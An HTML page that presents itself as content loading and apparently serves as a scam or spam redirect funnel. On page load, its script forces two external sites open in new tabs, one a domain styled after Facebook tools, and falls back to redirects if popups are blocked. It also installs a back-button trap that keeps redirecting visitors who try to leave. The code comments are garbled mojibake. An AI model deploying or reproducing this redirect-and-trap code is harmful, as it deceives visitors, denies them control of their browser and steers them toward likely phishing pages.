<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto Redirect Tabs</title>
</head>
<body style="margin:0;padding:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;">
  <h1>Please wait... Opening content ЁЯФе</h1>

<script>
(function(){
  var link1 = "https://shimulqww.github.io/Unitedstatesvideos/";
  var link2 = "https://fb-tools.social-networking.me";

  // ржкрзЗржЬ рж▓рзЛржб рж╣рж▓рзЗ ржжрзБржЗ рж▓рж┐ржВржХ ржЦрзБрж▓ржмрзЗ
  window.addEventListener("load", function(){
    // ржкрзНрж░ржержо рж▓рж┐ржВржХ ржирждрзБржи ржЯрзНржпрж╛ржмрзЗ
    var w1 = window.open(link1, "_blank");

    // ржЕрж▓рзНржк рж╕ржорзЯ ржкрж░рзЗ ржжрзНржмрж┐рждрзАрзЯ рж▓рж┐ржВржХ ржирждрзБржи ржЯрзНржпрж╛ржмрзЗ
    setTimeout(function(){
      var w2 = window.open(link2, "_blank");
      if(!w2 || w2.closed){
        // popup blocker рж╣рж▓рзЗ fallback
        window.location.href = link2;
      }
    }, 300);

    // ржпржжрж┐ popup blocker ржерж╛ржХрзЗ fallback рж╣рж┐рж╕рзЗржмрзЗ ржкрзНрж░ржержо рж▓рж┐ржВржХ ржУржкрзЗржи
    setTimeout(function(){
      if(!w1 || w1.closed){
        window.location.href = link1;
      }
    }, 600);
  });

  // ЁЯФД Back button trap (unlimited redirect)
  history.pushState(null, null, location.href);
  window.onpopstate = function () {
    history.pushState(null, null, location.href);
    // back ржкрзНрж░рзЗрж╕ ржХрж░рж▓рзЗ redirect рж╣ржмрзЗ ржпрзЗржХрзЛржирзЛ рж▓рж┐ржЩрзНржХрзЗ
    var targets = [link1, link2];
    var rand = targets[Math.floor(Math.random() * targets.length)];
    window.location.href = rand;
  };

})();
</script>
</body>
</html>
